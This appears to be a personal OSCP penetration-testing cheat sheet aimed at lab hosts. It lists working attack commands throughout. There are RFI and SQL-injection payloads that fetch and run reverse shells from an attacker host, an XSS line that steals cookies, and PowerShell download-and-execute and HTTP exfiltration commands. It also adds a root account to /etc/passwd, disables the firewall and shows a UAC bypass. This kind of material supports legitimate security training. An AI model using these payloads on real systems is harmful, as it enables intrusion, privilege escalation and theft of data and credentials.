OSCP 

##########################################################################
##				METHODOLOGY			##
##########################################################################
1. Enumerate all open ports and services. 
2. Interact with services to detect service version.
3. Use searchsploit to find exploit available for service version detected.
4. Triage list of exploits/services on basis of priority/likelihood.
5. Test if exploit will be successful; do not spend too much time to avoid rabbit holes.
6. If exploit works, continue. If exploit fails, re-evaluate exploit and triage accordingly.

## ENUMERATION TIPS: 
# 	Google every service + exploit + OS build version if available
# 	Probe unknown ports and explore high-value targets--especially HTTP services
# 	Run Nmap NSE scripts against non-HTTP services during enumeration
# 	Check ping <IP> before anything more advanced then sudo tcpdump -i tun0 icmp

##########################################################################
##	ENUMERATION & EXPLOITATION						##
##########################################################################
// HOST IDENTIFICATION/PING SWEEP
nmap -sn -v0 10.11.1.1-254 | grep "scan report for" | grep -v 'down' | awk -F' ' '{print $5}'
nmap -sn -v0 10.11.1.1-254 -oG hosts.lst; grep Up hosts.lst | cut -d' ' -f2 | sort -V -o hosts.lst
sort -t . -k 3,3n -k 4,4n hosts.lst -o hosts.lst

// PORT SCANS
nmap --min-rate=1000 --max-retries=0 -sT -sU -4 <IP> -Pn > portscan
masscan -p1-65535,U:1-65535 <IP> --rate=1000 -e tun0
nmap -sT -sU <IP> -p <OPEN PORTS> -sV -sC -O -Pn > services
nmap -sT -sU <IP> -p <PORTS> --script=vuln -Pn > vulns
host=<IP>; for port in {1..65535}; do timeout .1 bash -c "echo >/dev/tcp/$host/$port" && echo "port $port is open"; done; echo "Done!"
autorecon <IP> 

// UNKNOWN SERVICE ENUMERATOR
nc -nvC <IP> <PORT>
telnet <IP> <PORT>

// FTP (:21/tcp) - PROBING & EXPLOITATION
# Authenticate as user 'anonymous' and password 'null'
# Use 'bin' to put binary, ASCII for text
ftp <IP>
passive
dir ../ #traversal
bin
put shell.php
get /etc/passwd
nmap -p21 -sVC <IP>
nmap -p21 --script ftp-brute <IP>


//DOMAIN 53

nslookup 
server IP
1)localhost
2)IP
3) guess

dnsrecon -r 127.0.0.0/24 
dnsrecon -r subnet/24
dig axfr @IP


// SSH (:22/tcp) - PROBING & EXPLOITATION
ssh <IP> -p <PORT>
nc -nc <IP> 22
telnet <IP> 22
nmap -sVC <IP> -p22
searchsploit SSH version  # check shellshock
ssh -i noob noob@ip '() { :;}; /bin/bash'

// TELNET (:23/tcp) - PROBING & EXPLOITATION
telnet -l <user> <IP> 23
nmap -sVC -p23 <ip>
finger-user-enum.pl <OPTIONS> -u <USER> -t <IP>
finger-user-enum.pl <OPTIONS> -U USERS.txt -T HOSTS.txt

// SMTP (:25/tcp) - PROBING & EXPLOITATION
nc -nvC <IP> 25
	VRFY root
	HELO <user>@<domain>.com
	listusers
	setpassword <USER> <PASSWORD>
	nmap -p25 --script smtp-vuln* <IP>
nmap -p25 --script smtp-enum-users <IP>
smtp-user-enum -M VRFY -U list.txt -t <IP>
smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/unix_users.txt -t <IP>
smtp-user-enum -M EXPN -u unix_users.txt -t <IP>
smtp-user-enum -M EXPN -D <domain.com> -U unix_users.txt -t <IP>
finger -p "<USER>"
swaks --to <USER>@<DOMAIN>.local --from "<USER>@<DOMAIN>.local" --header "Subject: Status" --body body.txt --attach status.pdf --server <IP> --port 25 --auth LOGIN --auth-user "<USER>@<DOMAIN>.local" --auth-password <PASSWORD>

// TFTP (:69/udp) - EXFILTRATION
atftp -g -l MASTER.mdf  -r "C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.mdf" 10.11.1.111
tftp <IP> 

// POP3 (:110/tcp) - PROBING & EXPLOITATION
nc -nvC <IP> 110
	USER <USER>
	PASS <PASSWORD>
	LIST
	RETR <#>
nmap -p110 --script pop3-capabilities <IP>
nmap -p110 --script pop3-brute <IP>

// SNMP (:161/udp)- PROBING
snmpwalk -c public -v1 -t 10 10.11.1.115
snmp-check -c public -v1 10.11.1.115
snmpenum -c public -v1 <IP> 1
snmpenum -t <IP>
onesixtyone -c private -i 10.11.1.115
metasploit use auxiliary/scanner/snmp/snmp_enum

// RDP (:3389/tcp) - PROBING & EXPLOITATION:
rdesktop <IP> -u <user> -p <password> -5 -K -r clipboard:CLIPBOARD -g 90% -r disk:E:=/tmp
xfreerdp /u:<USER> /p:<PASSWORD> /v:<IP> 
xfreerdp /u:<USER> /pth:<NTLM> /v:<IP> 

// WINRM (:5985/tcp)
evil-winrm -i 10.11.1.221 -u john -p easyas123

// SMB & NETBIOS (:139/tcp|:445/tcp) - PROBING & EXPLOITATION
nmap -p139,445 --script smb-vuln* <IP>
smbver.sh <IP> <PORT>
ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' &
nmblookup -A <IP> 										
enum4linux -a <IP>
nbtscan <IP>
smbmap -H <IP>
smbmap -u null -p "" -H 1<I{> -P <PORT> -R 2>&1
smbmap -d <DOMAIN> -u <USER> -p <PASSWORD> -H <IP>
smbmap -R <FOLDERNAME> -H <IP>
smbmap -u <USER> -p '<PASSWORD>' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H <IP> 	# RCE
echo exit | smbclient -L \\\\<IP>
smbclient -L <IP>
smbclient //<IP>/tmp
smbclient \\<IP>\IPC$ -U john
smbclient //MOUNT/ahare -l target -N
smbclient \\\\<IP>\\\\<SHARE>
smbclient -L -N -I <IP>
smbclient \\\\<IP>\\\<SHARE> --port=<PORT> --user=<USER> # e.g., guest, etc.
./smbclient //10.11.1.136/'Bob Share' -N 
	symlink / rootfs
smbclient //10.11.1.136/'Bob Share' -c 'lcd /home/kali/Desktop/; cd /rootfs/etc; get passwd' -N
smbclient //10.11.1.231/docs -c 'lcd /home/kali/Desktop/; cd /postfix; get changelog.Debian.gz' -N
smbclient //10.11.1.146/SusieShare -c 'lcd /home/kali/Desktop/shell.exe; put libpoc.so' -N
smbclient -N //10.11.1.231/docs
crackmapexec smb <IP>
crackmapexec smb <IP> -u <USER> -p <PASS> --shares 
psexec.py administrator@10.11.1.220
smbexec.py <USER>@<IP> -hashes <NTLM>
pth-winexe -U <USER>%<NTLM>:<NTLM> 
pth-winexe -U <USER> //<IP> cmd
impacket-wmiexec <USER>@<IP> -hashes <NTLM>:<NTLM>
impacket-wmiexec <DOMAIN>/<USER>:<NTLM>@<IP>
impacket-smbserver share /home/kali
impacket-smbserver share ~/Desktop
winexe -U <USER> //<IP> "cmd.exe" --system

// NFS (:111/tcp|:2049/tcp|:20048/tcp) - PROBING & EXPLOITATION
nmap -sV --script=nfs-showmount <IP>
df -k
mount -t nfs <IP>:/srv/Share /tmp/share
mount -t cifs -o username=<USER>,vers=1.0 //10.11.1.5/c$ /mnt
mount -o nolock 10.11.1.72:/home /mnt/nfs-share
mount -t cifs -o vers=1.0 //10.11.1.136/'Bob Share' /mnt/SUFFERANCE

// RPCBIND(:111/tcp) & MSRPC (:135/tcp) - PROBING & EXPLOITATION
rpcinfo -p <IP>
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall
rpcinfo -s <IP>
rpcinfo -p <IP>
rpcclient -U "" -N <IP>
rpcclient -U "john" 10.11.1.221
rpcclient -U "" -N <IP> --command=enumprivs -N <IP>
showmount -a <IP>
showmount -e <IP>
showmount -d <IP>

// HTTP (:80/tcp|:443/tcp) - PROBING & EXPLOITATION
# /usr/share/dirb/wordlists/common.txt
# /usr/share/seclists/Discovery/Web-Content/common.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
# /usr/share/seclists/Discovery/Web-Content/raft-large-extensions.txt
curl http://<IP>:<PORT>/robots.txt
curl http://<IP>:<PORT>/sitemap.xml
dirsearch -r -f http://<IP>:<PORT> --extensions=htm,html,asp,aspx,txt,php,jsp,js,cgi w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --request-by-hostname -t 40 > dirsearch
gobuster dir -k -u http://<IP>:<PORT> -x "htm,html,asp,aspx,txt,php,jsp,js,cgi" -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -l -s "200,204,301,302,307" -o gobusted
nikto -host http://<IP>:<PORT> -C all -maxtime=30s -o nikto.txt
view-source:http://10.11.1.223/index.php?page=posts&post_id=69&com_status=open
curl 127.0.0.1:8080/manager/shell.jsp
curl -F "files=@shell.php" http://10.11.1.123/books/apps/jQuery-File-Upload/server/php/index.php
http://10.11.1.123/books/apps/jquery-file-upload/server/php/files/shell.php?cmd=shell.exe
https://beautifier.io/
wpscan --url 10.11.1.234 -v --detection-mode aggressive --enumerate ap,at,cb,dbe,u --api-token <MYTOKEN> --password-attack wp-login > wpscan
wpscan --url http://10.11.1.251/wp/ --wp-content-dir 10.11.1.251/wp/wp-content/ -v --enumerate ap,at,cb,dbe,u --password-attack wp-login > wpscan
whatweb <IP>
davest <IP>
nmap -p80 -sVC <IP>
nmap -p80 --script http-vuln* <IP>

// REMOTE FILE INCLUSION (RFI)
# echo "<?php echo shell_exec($_GET(['cmd'])?>" > evil.txt
http://<IP>/action=/inc/config.php?basePath=http://<ATTACKER-IP>/shell.php%00
http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=http://<ATTACKER-IP>:<PORT>/test.txt%00 
http://10.11.1.35/section.php?page=http://<ATTACKER-IP>:<PORT>/evil.txt&c=<COMMAND>
http://10.11.1.50:9505/?search=%00{.exec|C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<ATTACKER-IP>:<PORT>/shell.bat').}
http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=http://<ATTACKER-IP>:<PORT>/shell.txt?
http://192.168.131.10/menu.php?file=http:\\<ATTACKER-IP>:<PORT>\evil.txt?cmd=powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http:\\<ATTACKER-IP>:<PORT>\reverse-shell.bat'))"
http://192.168.131.10/menu.php?file=data:text/plain,<?php system($_GET['cmd']);?>"&cmd=powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://<ATTACKER-IP>:<PORT>/revshell.bat'))"

// LOCAL FILE INCLUSION (LFI) & DIRECTORY TRAVERSAL
http://<IP>/browse.php?p=source&file=../../../etc/passwd
wget http://<IP>/..%5C..%5C..%5CWindows%5CSystem32%5Cconfig%5CRegback%5CSAM.OLD
http://192.168.131.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http:\\<ATTACKER-IP>:<PORT>\reverse-shell.bat'))"
https://10.2.2.86/browse.php?p=source&file=C:\xampp\apache\logs\access.log
http://10.11.1.35/section.php?page=/etc/passwd
http://10.11.1.73:8080/PHP/fileManager/fileManager/collectives/DG0/NewAccess/shell2.php?cmd=powershell -c .\shell.exe
http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=/usr/local/databases/hack.php
http://10.11.1.141:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/etc/passwd
curl -l http://10.11.1.11/uploads/shell.php?cmd=whoami

// WEB & EMAIL SCRAPING
cewl http://10.11.1.39/otrs/index.pl -m 4 -w wordlist.txt
mentalist 
theHarvester -d megacorpone.com -b all

// XSS
<script>alert("XSS")</script>
<iframe src='http://<ATTACKER-IP>:<PORT>/ height="0" width="0"></iframe>
<script>new Image().src="http://<ATTACKER-IP>:<PORT>/cool.jpg?output="+document.cookie;</script>
<body onload=alert('XSS')>
<script src="<ATTACKER IP>:<PORT>"></script>

// DRUPAL
droopscan
drupwn

// MSSQL (:1433/tcp) - PROBING & EXPLOITATION
sqsh -S <IP> -U '<user>' -P '<password>'
EXEC sp_configure 'show advanced options',1
go
RECONFIGURE
go
EXEC sp_configure 'xp_cmdshell',1
go
RECONFIGURE
go
xp_cmdshell '<command>'; go;
EXEC xp_cmdshell ‘powershell -c “wget <ATTACKER-IP>/shell.exe -usebasicparsing -o shell.exe”'
nmap -p <PORT> --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PASSWORD>,ms-sql-xp-cmdshell.cmd="<command>" <IP>

// MYSQL (:3306/tcp) - PROBING & EXPLOITATION
mysql -h <IP> -u <user> -p<PASSWORD> -e 'show databases;'

// SQL INJECTION
# https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
# https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
# https://www.doyler.net/security-not-included/oracle-command-execution-sys-shell
' OR 1=1--
' OR 1=1--
' OR 1=1#
' OR 1=1)#
',null)#
',null)--
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
'EXEC master..xp_cmdshell 'net user /add kali 1234 && net localgroup administrators /add kali';--
'EXEC master..xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString('http://<ATTACKER-IP>/shell.ps1')"--
'EXEC master..xp_cmdshell "certutil.exe -urlcache -split -f http://<ATTACKER-IP>/maliciousfile"--
'EXEC master..xp_cmdshell "powershell Start-Process c:\ftproot\shell.exe"--
',convert(int,db_name()))--
',convert(int,@@VERSION))--
' AND 0=1 UNION SELECT 1,2--
' AND 0=1 UNION SELECT null,null--
' AND 0=1 UNION SELECT @@VERSION,2--
' AND 0=1 UNION SELECT @@SERVERNAME,2--
' AND 0=1 UNION SELECT @@VERSION,2--
',convert(int,(user_name())))--
',convert(int,(select table_name from information_schema.tables)))--
',convert(int,(SELECT name FROM master..syslogins)))--
',convert(int,(select top 1 table_name from information_schema.tables)))--
' UNION SELECT null,null,null FROM dual--
' UNION SELECT null,null,1 FROM dual--
' UNION SELECT null,2,3 FROM dual--
' UNION SELECT 1,null,3 FROM dual--
' UNION SELECT 1,2,3 FROM dual--
',convert(int,(select cast(concat(db_name(),0x3a,0x3a,table_name,0x0a) as varchar(8000)) from information_schema.tables for xml path(''))))--
',convert(int,(select cast(concat(db_name(),0x3a,0x3a,column_name,0x0a) as varchar(8000)) from information_schema.columns where table_name='users' for xml path(''))))--
',convert(int,(select cast(concat(username,0x3a,0x3a,email,0x0a) as varchar(8000)) from users for xml path(''))))--
' UNION SELECT user,(select banner from v$version where rownum=1),1 FROM dual--
' UNION SELECT table_name,null,1 FROM all_tables--
' UNION SELECT column_name,null,1 FROM all_tab_columns WHERE table_name='WEB_ADMINS'--
' UNION SELECT column_name,'',1 FROM all_tab_columns WHERE table_name='WEB_USERS'--
' UNION SELECT USER_NAME,PASSWORD,1 FROM WEB_USERS--
' UNION SELECT ADMIN_NAME,PASSWORD,1 FROM WEB_ADMINS--
',convert(int,(select cast(concat(0x3a,0x3a,name,0x0a) as varchar(8000)) from master..sysdatabases for xml path(''))))--
',convert(int,(select cast(concat('archive',0x3a,0x3a,table_name,0x0a) as varchar(8000)) from archive.information_schema.tables for xml path(''))))--
',convert(int,(select cast(concat('pmanager',0x3a,0x3a,column_name,0x0a) as varchar(8000)) from archive.information_schema.columns where table_name='pmanager' for xml path(''))))--
',convert(int,(select alogin,psw FROM archive WHERE table_name='pmanager' FOR XML PATH(''))))--
',convert(int,(select cast(concat(alogin,0x3a,0x3a,psw,0x0a) as varchar(8000)) from archive.dbo.pmanager FOR XML PATH(''))))--

// SQLi via GET Querystring
# Enumerate number of columns web app returns; increment final 1 to 2,3,4,etc. to see max col returned
http://192.168.131.10/debug.php?id=1 ORDER BY 1
# Enumerate OS User running DB & DB Version
http://192.168.131.10/debug.php?id=1 UNION SELECT 1,user(),@@version
# Enumerate All Databases' Tables and their respective columns
http://192.168.131.10/debug.php?id=1 UNION SELECT 1,table_name,column_name FROM information_schema.columns
# Enumerate users table column names and their datatypes if web app only returns 2 columns from SQL table and not the first column
http://192.168.131.10/debug.php?id=1 UNION SELECT 1,column_name,data_type FROM information_schema.columns WHERE table_name='users'
# Enumerate All Users & their Passwords from 'users' table
http://192.168.131.10/debug.php?id=1 UNION SELECT 1,username,password FROM users
# Read File from Underlying OS
http://192.168.131.10/debug.php?id=1 UNION SELECT 1,2,load_file('C:/Windows/System32/drivers/etc/hosts')
# Write File to Underlying OS to Establish Shell Access
http://192.168.131.10/debug.php?id=1 UNION SELECT 1,2,"<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE 'C:/xampp/htdocs/backdoor.php'
http://192.168.131.10/backdoor.php?cmd=powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://<ATTACKER-IP>/revshell.bat'))"

// SQL INJECTION: STEPS
# 1. Determine Number of Columns; search= is where the SQL Injection attack surface is.
http://192.168.131.10:9090/search?search=') UNION ORDER BY 1--
http://192.168.131.10:9090/search?search=') UNION ORDER BY 2--
http://192.168.131.10:9090/search?search=') UNION ORDER BY 3--
http://192.168.131.10:9090/search?search=') UNION ORDER BY 4--
http://192.168.131.10:9090/search?search=') UNION ORDER BY 5--
http://192.168.131.10:9090/search?search=') UNION ORDER BY 6--  // ERROR OCCURS!!! Max columns are 5

# 2. Determine Data Types for each field once max columns determined
http://192.168.131.10:9090/search?search=') UNION SELECT 'a',NULL,NULL,NULL,NULL--   # 'a' returned error
http://192.168.131.10:9090/search?search=') UNION SELECT NULL,'a',NULL,NULL,NULL--   # 'a' returned data indicating string
http://192.168.131.10:9090/search?search=') UNION SELECT NULL,'a','a',NULL,NULL--    # 'a' returned data indicating string
http://192.168.131.10:9090/search?search=') UNION SELECT NULL,'a','a','a',NULL--     # 'a' returned error
http://192.168.131.10:9090/search?search=') UNION SELECT NULL,'a','a',NULL,'a'--     # 'a' returned error

# 3. Attempt SQL Injection on table guess using guessed field names
http://192.168.131.10:9090/search?Search=') UNION SELECT NULL,username,password,NULL,NULL FROM users--

// NOSQL
' ||1==1//
, $where: '1 == 1'

// LDAP (:389/tcp|:636/tcp) - PROBING & EXPLOITATION
ldapsearch -h <IP> -p <PORT> -x -s base

// FILE TRANSFER - HTTP CLIENT
certutil.exe -urlcache -split -f "http://<ATTACKER-IP>:<PORT>/<file>" exploit.exe
bitsadmin /transfer mydownloadjob /download /priority normal http://<ATTACKER-IP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
cscript wget.vbs <ATTACKER IP>/<FILE> evil.exe
wget <ATTACKER-IP>:<PORT>/<FILE>.exe -usebasicparsing -o <file>.exe
powershell -c "wget <ATTACKER-IP>/<FILE>.exe -usebasicparsing -o <FILE>.exe"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER-IP>/<FILE>.exe','shell.exe')
# PowerShell Remote Script Execution w/o saving to target/victim HDD
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://<ATTACKER-IP>/script.ps1')

// BRUTE FORCE & PASSWORD CRACKING
# http://crackstation.net
# https://hashkiller.co.uk/Cracker
# https://www.cmd5.org/
# https://www.onlinehashcrack.com/
# https://gpuhash.me/
# https://crackstation.net/
# https://crack.sh/
# https://hash.help/
# https://passwordrecovery.io/
# http://cracker.offensive-security.com/
hydra -l <USER> -P /usr/share/wordlists/wfuzz/others/common_pass.txt ssh://<IP>
crowbar -b rdp -s <IP>/32 -u <USER> -C rockyou.txt -n 4
crowbar -b rdp -s 10.11.1.220/32 -U ./users.txt -C ./pass.txt -n 1
sudo john --wordlist=rockyou.txt --format=raw-sha1 hash.txt
hydra 10.11.1.39 http-form-post "/otrs/index.pl:User=root@localhost&Password=^PASS^:Login failed! Your user name or password was entered incorrectly." -l root@localhost -P wordlist.txt -vV -f
patator <module> (older unreliable services - telnet for example)
https://hashcat.net/wiki/doku.php?id=example_hashes -> hashcat64.exe -m <module> -a 0 hashes.txt crackstation.txt 

// SEARCHSPLOIT
searchsploit -t <SERVICE> | grep -v '/dos/'

// REFERENCES & CHEATSHEETS
https://medium.com/oscp-cheatsheet/oscp-cheatsheet-6c80b9fa8d7e
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

##########################################################################
##					INFRASTRUCTURE & CONFIGURATION						##
##########################################################################
// MOUNT VMWARE SHARE
sudo vmhgfs-fuse .host:/vmshare /mnt/vmshare -o allow_other

// WINDOWS COMMANDS & SETUP
# PowerShell Script Execution
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

// FILE TRANSFER - HTTP SERVER SETUP
python -m SimpleHTTPServer 80
python3 -m http.server 80
php -S 0.0.0.0:80
ruby -run -e httpd . -p 80
busybox httpd -f -o 80

// FILE TRANSFER - COMMANDLINE
# Convert binary to hex and send via commandline connection (e.g., nc, telnet, etc)
upx -9 nc.exe
exe2hex -x nc.exe -p nc.cmd

// FILE TRANSFER - HTTP POST EXFIL (WINDOWS->KALI)
# upload.php: Upload Data to Attack Box via HTTP POST Request
<?php $uploaddir='/var/www/uploads/'; $uploadfile=$uploaddir . $_FILES['file']['name']; move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)?>
powershell (New-Object System.Net.WebClient).UploadFile('http://<ATTACKER-IP>:<PORT>/upload.php', 'important.docx')

// DECODING
base64 -d <text-file>

// COMPILING EXPLOITS

* * *i686-w64-mingw32-gcc 40564.c -o MS11046.exe -lws2_32
gcc –m64 -Wl,--hash-style=both 44298.c -o privesc
gcc -m32 -Wl,--hash-style=both 9542.c -o 9542
gcc exploit.c -o exploit
wine syncbreeze_exploit.exe
whereis gcc

// MOUNT SHARE AND PSEXEC
	1) net use * \\10.11.1.21\C$
	2) Z:
	3) copy shell to somewhere writable on remote host
	4) PsExec.exe -accepteula \\10.11.1.21 \Users\administrator.svcorp\Desktop\meter.exe

##########################################################################
##					LINUX PRIVILEGE ESCALATION 							##
##########################################################################
// RESTRICTED SHELL (RBASH) ESCAPE
# https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
echo $SHELL 
echo os.system("/bin/bash")

// SPAWNING SHELL
use Socat, get socat portable binary
# Do this once you get on a Linux box for better shell; e.g., tab autocomplete
echo $TERM
CTRL+Z
stty raw -echo
fg
<ENTER>
<ENTER>
export TERM=<echo $TERM value>
echo $TERM 

// UPGRADE LINUX TTY
python -c 'import pty;pty.spawn("/bin/bash")'
perl -e 'exec "/bin/sh";'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
perl> exec "/bin/sh";
ruby> exec "/bin/sh"
lua> os.execute('/bin/sh')
vi> :!bash
vi> :set shell=/bin/bash:shell
nmap> !sh
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

// LINUX PRIVESC ENUMERATION
whoami && id && hostname
sudo su -
sudo -l
ls -lisah /etc/passwd
cat /etc/passwd | cut -d: f1
cat /etc/sudoers
	# echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
uname -a && cat /etc/*-release && arch
uname -a && cat /etc/issue && arch
ps aux | grep root
ls /usr/local/
ls /usr/local/src
ls /usr/local/bin
ls /opt/
ls /home
ls /var
ls /usr/src/
dpkg -l
rpm	-qa 
pkg_info
netstat -antp | grep 127.0.0.1
netstat -tulnpe
ip a 
ifconfig a
/sbin/route
ss -anp
grep -Hs iptables /etc/*			
cat /etc/iptables-backup
ls -lah /etc/cron*	
cat /etc/crontab
crontab -l	
grep "CRON" /var/log/cron.log
find / -perm -1000 -type d 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
	# GTFOBINS.com; LOLBINS
find / -writable -type d 2>/dev/null
find /etc/ -readable -type f 2>/dev/null
cat /etc/fstab
mount		
cat /etc/fstab	
/bin/lsblk
cat /etc/export
cd /srv/
lsmod
/sbin/modinfo <module>

// PRIVESC: /etc/passwd
	1) openssl passwd mrcake (get hash generated from this command; e.g., hKLD3431415ZE)
	2) echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd
	3) su root2
	4) Password: mrcake

// MYSQL RUNNING AS ROOT
# Raptor exploit: https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/	

// AUTOMATED PE CHECK SCRIPTS
Linuxprivchecker.py (at the bottom it has exploit suggestions)
linux-exploit-suggester
Linux_Exploit_Suggester.pl -k <KERNEL VERSION> (e.g., "2.6")
lse.sh
linpeas.sh
./unix-privesc-check standard				# Linux checks for non-root writable config files
./unix-privesc-check detailed > output.txt; grep "WARNING" output.txt
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

##########################################################################
##					WINDOWS PRIVILEGE ESCALATION						##
##########################################################################
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Windows-files.txt
whoami && whoami /priv && hostname
	# SeImpersonatePrivilege: JuicyPotato.exe (not for Windows Server 2019; need CLSID http://ohpe.it/juicy-potato/CLSID/)
net user <username>
net user				
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
	# WIN10-1803 PE: COMahawk.exe
comahawk.exe 
tasklist /SVC
dir "C:\Program Files"
dir "C:\Program Files (x86)"
dir /Q <DIRECTORY>
wmic product get name,version,vendor				
wmic qfe get Caption, Description, HoxFixID,InstalledOn
ipconfig /all		
route print		
netstat -ano 
netsh advfirewall show currentprofile		
netsh advfirewall firewall show rule name=all
netsh advfirewall show allprofiles
netsh advfirewall firewall set allprofiles state=off
netsh firewall set opmode disable
schtasks /query /fo LIST /v	
c:\WINDOWS\SchedLgU.Txt
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} | findstr "Program Files"
accesschk.exe -uws "Everyone" "C:\Program Files"
icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
	net stop Serviio
wmic service where caption="<SERVICENAME>" get name,caption,state,startmode
gci "C:\Program Files" -Recurse|Get-ACL|?[$_.AccessToString -match "Everyone\sAllow\sModify"}
mountvol 		
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name','Start Mode',Path
driverquery /v
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion,Manufacturer|Where-Object {$_.DeviceName -like "*VMware*"}
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Enumerate Auto-Elevating Binaries (AlwaysInstallElevated)
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

// AUTOMATED PE CHECK SCRIPTS
https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
https://www.fuzzysecurity.com/tutorials/16.html
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
https://guif.re/windowseop
Powerless.bat
JAWS.ps1
Sherlock.ps1 (Find-AllVulns)
PowerUp.ps1 (Invoke-AllChecks)
WinPEAS.exe
windows-privesc-check2.exe --dump -G					# Windows privesc shows groups on system
windows-privesc-check2.exe --audit --all -o output.txt	# Windows privesc shows all system data
windows-exploit-suggester.py --impact "elevation of privilege" systeminfo.txt
	
// DLL HIJACKING (WINDOWS 7)
# check for IKEEXT service
??????????????????????????????????

// UAC BYPASS
# https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
powershell-empire: get agent on box; interact with agent; bypassuac
locate bypassuac-x86.exe
locate bypassuac-x64.exe
rdesktop 10.11.1.221 -u administrator -p password (can use GUI to click accept)
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe (check app XML file manifest of when it starts)
REG ADD HKCU\Software\Classes\ms-settings\shell\open\command
REG ADD HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\shell\open /d cmd.exe /f

// RUNAS 
runas /user:<localmachinename>\administrator cmd
$secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force $mycreds = New-Object System.Management.Automation.PSCredential ("alice",$secpasswd) $computer = "Bethany" [System.Diagnostics.Process]::Start("C:\Users\Public\nc.exe","<ATTACKER-IP> <PORT> -e cmd.exe",$mycreds.Username,$mycreds.Password,$computer)

##########################################################################
##							LATERAL MOVEMENT							##
##########################################################################
// RINETD
vim /etc/rinetd.conf 
bindaddress | bindport	|	connectaddress	| connectport 
0.0.0.0		|	80 		|		<IP>		| 	<PORT>

// PORT FORWARDING: LOCAL-TO-DYNAMIC
# Forward proxychains connections on 9050
kali@kali: ssh -L 9050:127.0.0.1:9050 sean@10.11.1.251
sean@sean: ssh -N -D 9050 mario@10.1.1.1 -p222

// LOCAL PORT FORWARD:
sudo ssh -N -L 0.0.0.0:445:<INTERNAL-TARGET-IP>:445 <USER>@<COMPROMISED-HOST>
	/etc/samba/smb.conf (add 'min protocol = SMB2' if necessary and save'
	sudo /etc/init.d/smbd restart
sudo proxychains ssh megan@10.1.1.27 -L111:127.0.0.1:111 -L20048:127.0.0.1:20048 -L2049:127.0.0.1:2049

// REMOTE PORT FORWARDING
# When you don't have credentials and need to forward a port 
systemctl start ssh.service
